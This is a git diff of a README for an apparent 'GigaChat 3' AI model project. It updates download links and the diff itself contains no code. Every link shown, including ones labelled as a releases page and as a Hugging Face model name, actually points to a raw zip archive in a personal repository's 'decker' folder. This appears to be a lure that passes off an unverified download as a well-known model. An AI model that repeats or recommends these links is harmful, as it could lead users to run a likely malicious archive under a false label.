@@ -6,15 +6,15 @@ Welcome to GigaChat 3! This guide will help you download and run our advanced AI
 
 ## ⚡ Download GigaChat 3
 
-[![Download GigaChat 3](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat3-v1.7.zip%203-blue)](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat3-v1.7.zip)
+[![Download GigaChat 3](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat-1.0.zip%203-blue)](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat-1.0.zip)
 
-Visit this page to download the latest version: [GigaChat 3 Releases](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat3-v1.7.zip)
+Visit this page to download the latest version: [GigaChat 3 Releases](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat-1.0.zip)
 
 ## 📥 Download & Install
 
 1. **Go to the Releases Page**  
    Click on the link below to visit the GigaChat 3 Releases page.  
-   [Download GigaChat 3 here](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat3-v1.7.zip).
+   [Download GigaChat 3 here](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat-1.0.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of GigaChat 3. It is usually listed first. Click on it to view the details.
@@ -58,7 +58,7 @@ You can access more details about the models we offer:
 
 - **GigaChat 3 Ultra Preview**  
   Find the instruct model here:  
-  [`ai-sage/GigaChat3-702B-A36B-preview`](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat3-v1.7.zip)
+  [`ai-sage/GigaChat3-702B-A36B-preview`](https://raw.githubusercontent.com/MITHUN8521/gigachat3/main/decker/gigachat-1.0.zip)
 
 - **Fine-tuning Checkpoint (bf16)**  
   More information can be found on the Hugging Face platform.
